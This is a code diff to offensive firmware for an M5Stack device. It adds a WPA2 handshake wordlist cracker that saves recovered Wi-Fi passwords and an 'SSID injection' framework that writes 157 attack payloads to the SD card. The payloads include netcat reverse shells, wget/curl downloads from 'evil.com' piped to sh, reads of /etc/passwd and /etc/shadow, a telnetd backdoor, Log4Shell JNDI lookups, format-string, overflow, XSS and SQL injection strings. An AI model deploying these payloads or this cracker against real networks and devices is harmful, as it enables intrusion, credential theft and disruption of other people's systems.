+  for (int ai = 0; ai < (int)validIdx.size(); ai++) {
+    int vi = validIdx[ai];
+    const PcapHsEntry &entry = hsEntries[vi];
+
+    int globalIdx = apOffset + ai + 1;
+    Serial.printf("[WPA2] Cracking AP %d/%d: SSID='%s'\n", globalIdx, totalAps, entry.ssid);
+
+    if (!evil_wpa2_extract_by_bssid(pcapPath, entry.bssid, entry.ssid, g_wpa2)) {
+      Serial.printf("[WPA2] Failed to extract HS for %s, skipping\n", entry.ssid);
+      continue;
+    }
+
+    char apm[18];
+    macToStr(g_wpa2.ap, apm);
+
+    M5.Display.clear();
+    M5.Display.setTextSize(1.5);
+    M5.Display.setCursor(5, 0);
+    M5.Display.printf("AP %d/%d\n", globalIdx, totalAps);
+    M5.Display.println("Dual-Core Attack");
+    M5.Display.println("--------------------");
+    M5.Display.printf("SSID: %s\n", g_wpa2.ssid);
+    M5.Display.printf("AP: %s\n", apm);
+    M5.Display.printf("WL: %s\n", wlName.c_str());
+    M5.Display.println("Starting...");
+    M5.Display.display();
+    delay(300);
+
+    char found_pw[EVIL_WPA2_PASS_MAX];
+    found_pw[0] = '\0';
+    bool ok = evil_wpa2_wordlist_attack(g_wpa2, wlPath.c_str(), found_pw, sizeof(found_pw));
+    Serial.printf("[WPA2] %s -> %s\n", entry.ssid, ok ? "FOUND" : "NOT FOUND");
+
+    if (ok && found_pw[0]) {
+      foundCount++;
+      evil_wpa2_save_cracked(entry.ssid, found_pw);
+
+      M5.Display.clear();
+      M5.Display.setTextSize(1.5);
+      M5.Display.setCursor(5, 15);
+      M5.Display.printf("CRACKED: %s\n", entry.ssid);
+      M5.Display.printf("PW: %s\n", found_pw);
+      M5.Display.println("Saved! Continuing...");
+      M5.Display.display();
+      delay(2000);
+    }
+  }
+  return foundCount;
+}
+
+/* =================================================================
+   Main menu: select PCAP + wordlist + crack (multi-AP + ALL PCAPs)
+   ================================================================= */
+void evil_wpa2_passphrase_check_menu() {
+  inMenu = false;
+  enterDebounce();
+
+  const char *HS_DIR = "/evil/handshakes";
+  const char *WL_DIR = "/evil";
+
+  /* ---- Step 1: List all .pcap files + ALL option ---- */
+  std::vector<String> files;
+  {
+    File dir = SD.open(HS_DIR);
+    if (dir && dir.isDirectory()) {
+      while (File f = dir.openNextFile()) {
+        if (!f.isDirectory()) {
+          String n = f.name();
+          if (n.endsWith(".pcap")) files.push_back(n);
+        }
+        f.close();
+      }
+      dir.close();
+    }
+  }
+  if (files.empty()) { waitAndReturnToMenu("No PCAP found"); return; }
+
+  /* Build menu: [ALL] + individual files */
+  std::vector<String> pcapMenu;
+  pcapMenu.push_back("[ALL] Test all PCAPs");
+  for (const String &fn : files) pcapMenu.push_back(fn);
+
+  int pcapChoice = menuSelectList(pcapMenu, "Select PCAP");
+  if (pcapChoice < 0) { waitAndReturnToMenu("Cancelled"); return; }
+
+  bool allPcaps = (pcapChoice == 0);
+
+  /* ---- Step 2: Select wordlist ---- */
+  std::vector<String> wlFiles;
+  {
+    File dir = SD.open(WL_DIR);
+    if (dir && dir.isDirectory()) {
+      while (File f = dir.openNextFile()) {
+        if (!f.isDirectory()) {
+          String n = f.name();
+          if (n.endsWith(".txt")) wlFiles.push_back(n);
+        }
+        f.close();
+      }
+      dir.close();
+    }
+  }
+  if (wlFiles.empty()) { waitAndReturnToMenu("No wordlist in /evil/"); return; }
+
+  int wlIdx = menuSelectList(wlFiles, "Select Wordlist");
+  if (wlIdx < 0) { waitAndReturnToMenu("Cancelled"); return; }
+
+  String wlPath = String(WL_DIR) + "/" + wlFiles[wlIdx];
+  Serial.printf("[WPA2] Wordlist: %s\n", wlPath.c_str());
+
+  /* ---- Step 3: ALL PCAPs mode ---- */
+  if (allPcaps) {
+    /* First pass: count total valid APs across all PCAPs */
+    int totalAps = 0;
+    for (const String &fn : files) {
+      String path = String(HS_DIR) + "/" + fn;
+      PcapHsEntry tmpEntries[MAX_HS_PER_PCAP];
+      bool tmpBeacon = false;
+      int cnt = parsePcapMultiHS(path, tmpEntries, MAX_HS_PER_PCAP, tmpBeacon);
+      for (int i = 0; i < cnt; i++) {
+        if (tmpEntries[i].paired && tmpEntries[i].ssid[0]) totalAps++;
+      }
+    }
+
+    if (totalAps == 0) { waitAndReturnToMenu("No valid HS in any PCAP"); return; }
 
     M5.Display.clear();
     M5.Display.setTextSize(1.5);
     M5.Display.setCursor(5, 10);
-    M5.Display.println("WPA2 cracking");
-    M5.Display.println("----------------");
-    M5.Display.print("Try: ");
-    M5.Display.println(line);
-    M5.Display.print("Count: ");
-    M5.Display.println(tested);
+    M5.Display.printf("ALL mode: %d PCAPs\n", (int)files.size());
+    M5.Display.printf("%d valid APs\n", totalAps);
+    M5.Display.println("Starting...");
     M5.Display.display();
+    delay(1000);
 
-    if (evil_wpa2_check_passphrase(hs, line)) {
-      Serial.printf("[WPA2] FOUND: %s (%lu tries)\n", line, tested);
-      delay(5000);
-      f.close();
-      return true;
+    int totalFound = 0;
+    int apOffset = 0;
+    for (const String &fn : files) {
+      String path = String(HS_DIR) + "/" + fn;
+      Serial.printf("[WPA2] Processing: %s\n", fn.c_str());
+
+      /* Count valid APs in this pcap for offset tracking */
+      PcapHsEntry tmpEntries[MAX_HS_PER_PCAP];
+      bool tmpBeacon = false;
+      int cnt = parsePcapMultiHS(path, tmpEntries, MAX_HS_PER_PCAP, tmpBeacon);
+      int validInThis = 0;
+      for (int i = 0; i < cnt; i++) {
+        if (tmpEntries[i].paired && tmpEntries[i].ssid[0]) validInThis++;
+      }
+
+      if (validInThis > 0) {
+        totalFound += evil_wpa2_crack_pcap(path, fn, wlPath, wlFiles[wlIdx], totalAps, apOffset);
+        apOffset += validInThis;
+      }
     }
 
-    if ((tested & 0x01) == 0) {
-      uint32_t dt = millis()-t0;
-      Serial.printf("[WPA2] %lu tested (%.1f/s)\n",
-        tested, dt ? tested*1000.0f/dt : 0);
-    }
-  }
-
-  f.close();
-  return false;
-}
-
-
-
-void evil_wpa2_passphrase_check_menu() {
-  inMenu = false;
-  
-  enterDebounce();
-
-  const char *DIR = "/evil/handshakes";
-  #define MAX_PCAPS 16
-  String files[MAX_PCAPS];
-  int fileCount = 0;
-  fileCount = evil_list_pcaps(DIR, files, MAX_PCAPS);
-  if (fileCount == 0) {
-    waitAndReturnToMenu("No PCAP");
+    char msg[64];
+    snprintf(msg, sizeof(msg), "Done: %d/%d cracked", totalFound, totalAps);
+    waitAndReturnToMenu(msg);
     return;
   }
 
-
-  int idx = menuSelectListArray(files, fileCount, "Select PCAP");
-  if (idx < 0) { waitAndReturnToMenu("Cancelled"); return; }
-
-  String path = String(DIR) + "/" + files[idx];
-  Serial.printf("[WPA2] Selected: %s\n", path.c_str());
+  /* ---- Step 3b: Single PCAP mode ---- */
+  String pcapPath = String(HS_DIR) + "/" + files[pcapChoice - 1];
+  Serial.printf("[WPA2] Selected: %s\n", pcapPath.c_str());
 
   M5.Display.clear();
   M5.Display.setTextSize(1.5);
   M5.Display.setCursor(5, 5);
   M5.Display.println("Parsing PCAP...");
-  M5.Display.println(files[idx]);
+  M5.Display.println(files[pcapChoice - 1]);
   M5.Display.display();
- 
-  delay(500);
 
-  if (!evil_wpa2_extract_from_pcap(path, g_wpa2)) {
-    waitAndReturnToMenu("No valid HS/SSID");
-    return;
+  PcapHsEntry hsEntries[MAX_HS_PER_PCAP];
+  bool hasBeacon = false;
+  int apCount = parsePcapMultiHS(pcapPath, hsEntries, MAX_HS_PER_PCAP, hasBeacon);
+
+  std::vector<int> validIdx;
+  for (int i = 0; i < apCount; i++) {
+    if (hsEntries[i].paired && hsEntries[i].ssid[0]) {
+      validIdx.push_back(i);
+    }
+  }
+  if (validIdx.empty()) { waitAndReturnToMenu("No valid HS/SSID"); return; }
+
+  Serial.printf("[WPA2] Found %d valid AP(s)\n", (int)validIdx.size());
+
+  /* AP selection: if multiple, show submenu with ALL */
+  int apSel = 0;
+  bool crackAllAps = false;
+
+  if (validIdx.size() > 1) {
+    std::vector<String> apMenu;
+    apMenu.push_back("[ALL] Crack all APs");
+    for (int vi : validIdx) {
+      char bssidStr[18];
+      sprintf(bssidStr, "%02X:%02X:%02X:%02X:%02X:%02X",
+        hsEntries[vi].bssid[0], hsEntries[vi].bssid[1], hsEntries[vi].bssid[2],
+        hsEntries[vi].bssid[3], hsEntries[vi].bssid[4], hsEntries[vi].bssid[5]);
+      String label = String(hsEntries[vi].ssid) + " (" + bssidStr + ")";
+      if (hsEntries[vi].hasM3 && hsEntries[vi].hasM4) label += " 4W";
+      apMenu.push_back(label);
+    }
+
+    int apChoice = menuSelectList(apMenu, "Select AP");
+    if (apChoice < 0) { waitAndReturnToMenu("Cancelled"); return; }
+
+    if (apChoice == 0) {
+      crackAllAps = true;
+    } else {
+      apSel = apChoice - 1;
+    }
   }
 
-  char apm[18], stam[18];
-  macToStr(g_wpa2.ap, apm);
-  macToStr(g_wpa2.sta, stam);
+  /* Crack selected AP(s) */
+  int startAp = crackAllAps ? 0 : apSel;
+  int endAp   = crackAllAps ? (int)validIdx.size() : (apSel + 1);
+  int foundCount = 0;
 
-  Serial.printf("[WPA2] HS OK SSID='%s' AP=%s STA=%s\n", g_wpa2.ssid, apm, stam);
+  for (int ai = startAp; ai < endAp; ai++) {
+    int vi = validIdx[ai];
+    const PcapHsEntry &entry = hsEntries[vi];
 
+    Serial.printf("[WPA2] Cracking AP %d/%d: SSID='%s'\n",
+                  ai - startAp + 1, endAp - startAp, entry.ssid);
 
-  M5.Display.clear();
-  M5.Display.setTextSize(1.5);
-  M5.Display.setCursor(5, 0);
-  M5.Display.println("Handshake OK");
-  M5.Display.println("----------------");
-  M5.Display.print("SSID: "); M5.Display.println(g_wpa2.ssid);
-  M5.Display.print("AP: ");   M5.Display.println(apm);
-  M5.Display.print("STA: ");  M5.Display.println(stam);
-  M5.Display.println("----------------");
-  M5.Display.display();
+    if (!evil_wpa2_extract_by_bssid(pcapPath, entry.bssid, entry.ssid, g_wpa2)) {
+      Serial.printf("[WPA2] Failed to extract HS for %s, skipping\n", entry.ssid);
+      if (crackAllAps) continue;
+      waitAndReturnToMenu("HS extract failed");
+      return;
+    }
 
-  delay(2000);
-  
-  const char *WORDLIST = "/evil/wpa_wordlist.txt";
-  
-  M5.Display.clear();
-  M5.Display.setTextSize(1.5);
-  M5.Display.setCursor(5, 10);
-  M5.Display.println("Wordlist attack");
-  M5.Display.println("----------------");
-  M5.Display.println("Please wait...");
-  M5.Display.display();
-  
-  bool ok = evil_wpa2_wordlist_attack(g_wpa2, WORDLIST);
+    char apm[18];
+    macToStr(g_wpa2.ap, apm);
 
-  Serial.printf("[WPA2] PASS %s\n", ok ? "MATCH" : "NO");
+    M5.Display.clear();
+    M5.Display.setTextSize(1.5);
+    M5.Display.setCursor(5, 0);
+    if (crackAllAps || endAp - startAp > 1) {
+      M5.Display.printf("AP %d/%d\n", ai - startAp + 1, endAp - startAp);
+    }
+    M5.Display.println("Dual-Core Attack");
+    M5.Display.println("--------------------");
+    M5.Display.printf("SSID: %s\n", g_wpa2.ssid);
+    M5.Display.printf("AP: %s\n", apm);
+    M5.Display.printf("WL: %s\n", wlFiles[wlIdx].c_str());
+    M5.Display.println("Starting...");
+    M5.Display.display();
+    delay(300);
 
-  waitAndReturnToMenu(ok ? "Passphrase Found" : "No match");
+    char found_pw[EVIL_WPA2_PASS_MAX];
+    found_pw[0] = '\0';
+    bool ok = evil_wpa2_wordlist_attack(g_wpa2, wlPath.c_str(), found_pw, sizeof(found_pw));
+    Serial.printf("[WPA2] %s -> %s\n", entry.ssid, ok ? "FOUND" : "NOT FOUND");
+
+    if (ok && found_pw[0]) {
+      foundCount++;
+      evil_wpa2_save_cracked(entry.ssid, found_pw);
+
+      M5.Display.clear();
+      M5.Display.setTextSize(1.5);
+      M5.Display.setCursor(5, 15);
+      M5.Display.printf("CRACKED: %s\n", entry.ssid);
+      M5.Display.printf("PW: %s\n", found_pw);
+      M5.Display.println("Saved to cracked.txt");
+      M5.Display.display();
+
+      if (!crackAllAps) {
+        delay(3000);
+        waitAndReturnToMenu("Password Found!");
+        return;
+      }
+      M5.Display.println("Continuing...");
+      M5.Display.display();
+      delay(2000);
+    }
+  }
+
+  char msg[64];
+  if (crackAllAps) {
+    snprintf(msg, sizeof(msg), "Done: %d/%d cracked", foundCount, endAp - startAp);
+  } else {
+    snprintf(msg, sizeof(msg), "No match found");
+  }
+  waitAndReturnToMenu(msg);
 }
 
 
@@ -35736,6 +36630,10 @@ void adFlashCapture(bool isBasic) {
   }
 }
 
+
+// =================== Raw HTTP helpers (reuse existing) ===================
+// httpReadLine() and httpReadHeaders() are already defined in the codebase
+// buildType2Challenge(), base64Encode(), base64Decode(), detectNtlmMessageType() too
 
 
 // =================== Extract header value from raw headers ===================
@@ -36326,4 +37224,998 @@ void autodiscoverAbuse() {
   if ((adBasicCount + adNtlmCount) > 0)
     exitMsg += "Saved to SD:/evil/";
   waitAndReturnToMenu(exitMsg);
+}
+
+// ============================================================================
+// ===== CIW ZEROCLICK — SSID Injection Testing Framework ====================
+// ============================================================================
+
+// ── Default Payloads (PROGMEM) ─────────────────────────────────────────────
+// 157 payloads across 14 categories — stored as compact JSON
+// Keys: t=text, c=category, d=description
+
+// Default payloads written directly to SD via F() strings in ciwEnsurePayloadsFile().
+
+
+
+// ── Category string → enum mapping ─────────────────────────────────────────
+uint8_t ciwCatFromStr(const char* s) {
+  for (uint8_t i = 0; i < CIW_CAT_COUNT; i++) {
+    if (strcmp(s, ciwCatNames[i]) == 0) return i;
+  }
+  return 0xFF;
+}
+
+// ── SD file management — write default payloads line by line using F() ─────
+// Macro writes one JSON payload entry to the file handle.
+// Each F() string lives in flash; only a tiny buffer is used per print call.
+#define CIW_WP(fh, _t, _c, _d) do { \
+  fh.print(F("{\"t\":\"")); fh.print(_t); \
+  fh.print(F("\",\"c\":\"")); fh.print(_c); \
+  fh.print(F("\",\"d\":\"")); fh.print(_d); \
+  fh.print(F("\"}")); \
+} while(0)
+
+void ciwEnsurePayloadsFile() {
+  if (SD.exists("/evil/ciw/payloads.json")) return;
+  SD.mkdir("/evil");
+  SD.mkdir("/evil/ciw");
+  File f = SD.open("/evil/ciw/payloads.json", FILE_WRITE);
+  if (!f) { Serial.println(F("CIW: Failed to create payloads.json")); return; }
+
+  f.print('[');
+  #define P(_t,_c,_d) CIW_WP(f, _t, _c, _d)
+  #define SEP f.print(',')
+
+  // wifi_cmd (25)
+  P("|reboot|","wifi_cmd","Pipe operator reboot");SEP;
+  P("&reboot&","wifi_cmd","Ampersand command chain");SEP;
+  P("`reboot`","wifi_cmd","Backtick command substitution");SEP;
+  P("$reboot$","wifi_cmd","Dollar-sign variable expansion");SEP;
+  P(";reboot;","wifi_cmd","Semicolon command separator");SEP;
+  P("$(reboot)","wifi_cmd","Subshell command substitution");SEP;
+  P("|shutdown -r|","wifi_cmd","Pipe with shutdown");SEP;
+  P("&cat /etc/passwd","wifi_cmd","Ampersand passwd read");SEP;
+  P("reboot\\nreboot","wifi_cmd","Newline command injection");SEP;
+  P("reboot\\r\\nreboot","wifi_cmd","CRLF command injection");SEP;
+  P("|../../bin/sh|","wifi_cmd","Path traversal to shell");SEP;
+  P("${IFS}reboot","wifi_cmd","IFS variable separator");SEP;
+  P("*;reboot","wifi_cmd","Glob with command chain");SEP;
+  P("$(echo reboot|sh)","wifi_cmd","Echo piped to shell");SEP;
+  P("reboot\\x00ignored","wifi_cmd","Null byte truncation");SEP;
+  P("|nc -lp 4444 -e sh|","wifi_cmd","Netcat reverse shell via pipe");SEP;
+  P("&wget evil.com/x&","wifi_cmd","Download+execute via ampersand");SEP;
+  P("$(curl evil.com)","wifi_cmd","Curl fetch via subshell");SEP;
+  P("|id>/tmp/pwn|","wifi_cmd","Write id output to file");SEP;
+  P("\\x00|reboot|","wifi_cmd","Null-prefix command injection");SEP;
+  P("& ping -n 3 127.0.0.1 &","wifi_cmd","Windows cmd ping injection");SEP;
+  P("|powershell -c reboot|","wifi_cmd","PowerShell command via pipe");SEP;
+  P("`busybox reboot`","wifi_cmd","BusyBox-specific reboot");SEP;
+  P("$(kill -9 1)","wifi_cmd","Kill init process PID 1");SEP;
+  P("|/bin/busybox telnetd|","wifi_cmd","BusyBox telnet backdoor");SEP;
+
+  // wifi_overflow (26)
+  P("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA","wifi_overflow","32-byte A fill");SEP;
+  P("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA","wifi_overflow","64-byte A fill");SEP;
+  P("\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41","wifi_overflow","16-byte hex 0x41 fill");SEP;
+  P("\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00","wifi_overflow","16-byte null fill");SEP;
+  P("\\x7f\\x7f\\x7f\\x7f\\x7f\\x7f\\x7f\\x7f\\x7f\\x7f\\x7f\\x7f\\x7f\\x7f\\x7f\\x7f","wifi_overflow","16-byte DEL fill");SEP;
+  P("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA","wifi_overflow","33-byte off-by-one");SEP;
+  P("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA","wifi_overflow","65-byte off-by-one");SEP;
+  P("AAAAAAAAAAAAAAAA\\x00AAAAAAAAAAAAAAAA","wifi_overflow","Null-terminated boundary");SEP;
+  P("AAAAAAAAAAAAAAAAAAAAAAAAAAAA\\r\\nAA","wifi_overflow","CRLF at boundary");SEP;
+  P("\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff","wifi_overflow","16-byte 0xFF fill");SEP;
+  P("AAAAAAAA\\x00\\x00\\x00\\x00AAAAAAAA","wifi_overflow","Half-null padding");SEP;
+  P("%s%s%s%sAAAAAAAAAAAAAAAAAAAAAAAAAAAA","wifi_overflow","Overflow + format write");SEP;
+  P("DEAD\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41DEAD","wifi_overflow","Canary markers DEAD");SEP;
+  P("\\x41\\x41\\x41\\x41\\x42\\x42\\x42\\x42\\x43\\x43\\x43\\x43\\x44\\x44\\x44\\x44","wifi_overflow","Address overwrite pattern");SEP;
+  P("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x00","wifi_overflow","64-byte + null terminator");SEP;
+  P("A","wifi_overflow","Single byte");SEP;
+  P("","wifi_overflow","Empty SSID");SEP;
+  P(" ","wifi_overflow","Single space SSID");SEP;
+  P("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%n","wifi_overflow","Overflow + format write %n");SEP;
+  P("\\x80\\x80\\x80\\x80\\x80\\x80\\x80\\x80\\x80\\x80\\x80\\x80\\x80\\x80\\x80\\x80","wifi_overflow","High-bit byte fill");SEP;
+  P("\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10","wifi_overflow","Sequential byte fill");SEP;
+  P("ABCDEFGHIJKLMNOPQRSTUVWXYZ123456","wifi_overflow","32-byte sequential ASCII");SEP;
+  P("\\xfe\\xff\\xfe\\xff\\xfe\\xff\\xfe\\xff\\xfe\\xff\\xfe\\xff\\xfe\\xff\\xfe\\xff","wifi_overflow","Alternating 0xFE/0xFF");SEP;
+  P("\\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA","wifi_overflow","Null prefix + fill");SEP;
+  P("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x00","wifi_overflow","Fill + null suffix");SEP;
+  P("\\xde\\xad\\xbe\\xef\\xde\\xad\\xbe\\xef\\xde\\xad\\xbe\\xef\\xde\\xad\\xbe\\xef","wifi_overflow","DEADBEEF pattern repeat");SEP;
+
+  // wifi_fmt (15)
+  P("%s%s%s%s%s","wifi_fmt","Format string read crash");SEP;
+  P("%n%n%n%n","wifi_fmt","Format string write");SEP;
+  P("%x%x%x%x","wifi_fmt","Format hex leak");SEP;
+  P("%p%p%p%p","wifi_fmt","Format pointer leak");SEP;
+  P("%d%d%d%d%d%d","wifi_fmt","Format decimal overflow");SEP;
+  P("AAAA%08x%08x%08x","wifi_fmt","Format with canary");SEP;
+  P("%s%s%s%s%s%s%s%s%s%s","wifi_fmt","10x string deref");SEP;
+  P("%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x","wifi_fmt","16x hex leak");SEP;
+  P("%08x.%08x.%08x.%08x","wifi_fmt","Dotted hex leak");SEP;
+  P("%n%n%n%n%n%n%n%n","wifi_fmt","8x format write");SEP;
+  P("%hn%hn%hn%hn","wifi_fmt","Half-word format write");SEP;
+  P("%1$s%2$s%3$s","wifi_fmt","Positional string deref");SEP;
+  P("%1$n%2$n","wifi_fmt","Positional write");SEP;
+  P("%.9999d","wifi_fmt","Width overflow");SEP;
+  P("%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c","wifi_fmt","32x char print");SEP;
+
+  // wifi_probe (14)
+  P("","wifi_probe","Empty SSID probe");SEP;
+  P(" ","wifi_probe","Single space probe");SEP;
+  P("\\x00","wifi_probe","Single null byte");SEP;
+  P("\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08","wifi_probe","Control char fill");SEP;
+  P("\\t\\n\\r\\t\\n\\r\\t\\n","wifi_probe","Whitespace controls");SEP;
+  P("\\xe2\\x80\\x8b\\xe2\\x80\\x8b\\xe2\\x80\\x8b","wifi_probe","Zero-width spaces UTF-8");SEP;
+  P("ValidSSID\\xff","wifi_probe","Trailing invalid byte");SEP;
+  P("Test\\x00Hidden","wifi_probe","Null-embedded SSID");SEP;
+  P("\\xef\\xbb\\xbfBOM_SSID","wifi_probe","UTF-8 BOM prefix");SEP;
+  P("\\x1b[0m\\x1b[0m\\x1b[0m\\x1b[0m","wifi_probe","Escape sequence flood");SEP;
+  P("\\xe2\\x80\\xaeSSID_SPOOF","wifi_probe","RTL override spoof");SEP;
+  P("DIRECT-xx-SPOOF","wifi_probe","WiFi Direct prefix spoof");SEP;
+  P("\\xc0\\x80\\xc0\\x80\\xc0\\x80\\xc0\\x80","wifi_probe","Overlong null encoding");SEP;
+  P("\\xed\\xa0\\x80\\xed\\xa0\\x80","wifi_probe","Lone surrogate codepoints");SEP;
+
+  // wifi_esc (8)
+  P("\\x1b[2J\\x1b[H","wifi_esc","ANSI clear screen");SEP;
+  P("\\x1b]0;HACKED\\x07","wifi_esc","OSC title set");SEP;
+  P("\\x1b[6n","wifi_esc","Cursor position report");SEP;
+  P("\\x1b[?47h","wifi_esc","Alt screen buffer");SEP;
+  P("\\x1b[31mERROR\\x1b[0m","wifi_esc","Red colored fake log");SEP;
+  P("\\x1b[1A\\x1b[2K","wifi_esc","Overwrite log line");SEP;
+  P("\\x1b[32mroot@srv\\x1b[0m","wifi_esc","Fake root log");SEP;
+  P("\\x1b[8m","wifi_esc","Hidden text mode");SEP;
+
+  // wifi_serial (13)
+  P("\",\"admin\":true,\"x\":\"","wifi_serial","JSON key injection");SEP;
+  P("</name><admin>1</admin>","wifi_serial","XML tag escape");SEP;
+  P("'; DROP TABLE wifi;--","wifi_serial","SQLite injection");SEP;
+  P("{\"role\":\"admin\"}","wifi_serial","JSON privilege escalation");SEP;
+  P("key=val\\nnewsection","wifi_serial","INI newline injection");SEP;
+  P("{{7*7}}","wifi_serial","Jinja template injection");SEP;
+  P("<%= system('id') %>","wifi_serial","ERB template injection");SEP;
+  P("${7*7}","wifi_serial","SSTI expression");SEP;
+  P("=CMD(\\\"calc\\\")","wifi_serial","Excel formula CMD");SEP;
+  P("-1+1+cmd|'/C calc'!A0","wifi_serial","DDE minus prefix");SEP;
+  P("+1+cmd|'/C calc'!A0","wifi_serial","DDE plus prefix");SEP;
+  P("!!python/object/apply:os.system ['reboot']","wifi_serial","YAML deserialization");SEP;
+  P("O:8:\\\"stdClass\\\":0:{}","wifi_serial","PHP object deserialization");SEP;
+
+  // wifi_enc (8)
+  P("\\uff04(reboot)","wifi_enc","Fullwidth dollar normalization");SEP;
+  P("\\uff5creboot\\uff5c","wifi_enc","Fullwidth pipe normalization");SEP;
+  P("\\uff1breboot\\uff1b","wifi_enc","Fullwidth semicolon normalization");SEP;
+  P("%7Creboot%7C","wifi_enc","URL-encoded pipe");SEP;
+  P("%24(reboot)","wifi_enc","URL-encoded dollar");SEP;
+  P("\\u0060reboot\\u0060","wifi_enc","JSON Unicode-escaped backtick");SEP;
+  P("&vert;reboot&vert;","wifi_enc","HTML entity pipe");SEP;
+  P("\\xc0\\xafetc\\xc0\\xafpasswd","wifi_enc","Overlong UTF-8 slash");SEP;
+
+  // wifi_chain (8)
+  P("$(","wifi_chain","Split subshell open");SEP;
+  P("reboot)","wifi_chain","Split subshell close");SEP;
+  P("|nc 192.168.4.1","wifi_chain","Split netcat addr");SEP;
+  P("4444 -e /bin/sh|","wifi_chain","Split netcat port");SEP;
+  P("%x%x%x%x_LEAK","wifi_chain","Format leak phase");SEP;
+  P("%n%n_WRITE","wifi_chain","Format write phase");SEP;
+  P("wget http://192.168","wifi_chain","Split wget URL");SEP;
+  P(".4.1/x -O-|sh","wifi_chain","Split wget exec");SEP;
+
+  // wifi_heap (8)
+  P("\\x00\\x00\\x00\\x00\\x11\\x00\\x00\\x00","wifi_heap","dlmalloc prev_size pattern");SEP;
+  P("\\x41\\x00\\x00\\x00\\x41\\x00\\x00\\x00","wifi_heap","Fake chunk size");SEP;
+  P("\\xde\\xad\\xbe\\xef","wifi_heap","DEADBEEF canary");SEP;
+  P("\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01","wifi_heap","Integer 1 spray");SEP;
+  P("\\xfe\\xfe\\xfe\\xfe\\xfe\\xfe\\xfe\\xfe","wifi_heap","Near-max byte spray");SEP;
+  P("\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x04\\x00\\x40","wifi_heap","Null sled + return addr");SEP;
+  P("\\xba\\xad\\xf0\\x0d","wifi_heap","BAADF00D marker");SEP;
+  P("\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x00\\x00\\x00\\x41","wifi_heap","Heap spray + boundary");SEP;
+
+  // wifi_xss (8)
+  P("<script>alert(1)</script>","wifi_xss","Script tag alert");SEP;
+  P("<img src=x onerror=alert(1)>","wifi_xss","Img onerror XSS");SEP;
+  P("<svg onload=alert(1)>","wifi_xss","SVG onload");SEP;
+  P("<body onload=alert(1)>","wifi_xss","Body onload");SEP;
+  P("<details open ontoggle=alert(1)>","wifi_xss","Details ontoggle");SEP;
+  P("<iframe src=javascript:alert(1)>","wifi_xss","Iframe injection");SEP;
+  P("';alert(1)//","wifi_xss","JS string breakout");SEP;
+  P("<marquee onstart=alert(1)>","wifi_xss","Marquee onstart");SEP;
+
+  // wifi_path (6)
+  P("../../../etc/shadow","wifi_path","Classic path traversal");SEP;
+  P("..\\\\..\\\\..\\\\etc\\\\shadow","wifi_path","Double-dot bypass");SEP;
+  P("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","wifi_path","URL-encoded traversal");SEP;
+  P("/proc/self/environ","wifi_path","Proc environ read");SEP;
+  P("..\\\\..\\\\..\\\\windows\\\\system32","wifi_path","Mixed separator Windows");SEP;
+  P("/dev/urandom","wifi_path","Dev urandom read");SEP;
+
+  // wifi_crlf (6)
+  P("\\r\\nX-Injected: true","wifi_crlf","Custom header injection");SEP;
+  P("%0d%0aSet-Cookie:pwned=1","wifi_crlf","URL-encoded cookie");SEP;
+  P("\\r\\nLocation: http://evil","wifi_crlf","Redirect injection");SEP;
+  P("\\r\\n\\r\\n<html>injected","wifi_crlf","Response splitting");SEP;
+  P("\\r\\nTransfer-Encoding:chunked","wifi_crlf","Request smuggling");SEP;
+  P("\\r\\nContent-Length:0\\r\\n\\r\\n","wifi_crlf","Content-Length injection");SEP;
+
+  // wifi_jndi (6)
+  P("${jndi:ldap://evil/x}","wifi_jndi","Log4Shell LDAP");SEP;
+  P("${jndi:dns://evil/x}","wifi_jndi","JNDI DNS exfil");SEP;
+  P("${env:AWS_SECRET}","wifi_jndi","Env variable leak");SEP;
+  P("${sys:java.version}","wifi_jndi","System property leak");SEP;
+  P("${jndi:rmi://evil/x}","wifi_jndi","JNDI RMI");SEP;
+  P("${${lower:j}ndi:ldap://x}","wifi_jndi","Polyglot template probe");SEP;
+
+  // wifi_nosql (6) — last group, no trailing comma
+  P("admin' || '1'=='1","wifi_nosql","MongoDB $gt bypass");SEP;
+  P("{\"$ne\":1}","wifi_nosql","MongoDB $ne injection");SEP;
+  P("{\"$regex\":\".*\"}","wifi_nosql","MongoDB $regex match-all");SEP;
+  P("{\"$where\":\"sleep(5000)\"}","wifi_nosql","MongoDB $where sleep");SEP;
+  P("*)(objectClass=*)","wifi_nosql","LDAP wildcard filter");SEP;
+  P("admin)(!(&(1=0","wifi_nosql","LDAP password bypass");
+
+  f.print(']');
+  f.close();
+  Serial.println(F("CIW: Created default payloads.json on SD"));
+  #undef P
+  #undef SEP
+}
+
+// ── Load payloads from SD — stream parse, no large JSON doc in RAM ─────────
+void ciwLoadPayloads(uint16_t catMask) {
+  ciwPayloads.clear();
+  ciwCurrentIdx = 0;
+
+  File f = SD.open("/evil/ciw/payloads.json", FILE_READ);
+  if (!f) { Serial.println(F("CIW: payloads.json not found")); return; }
+
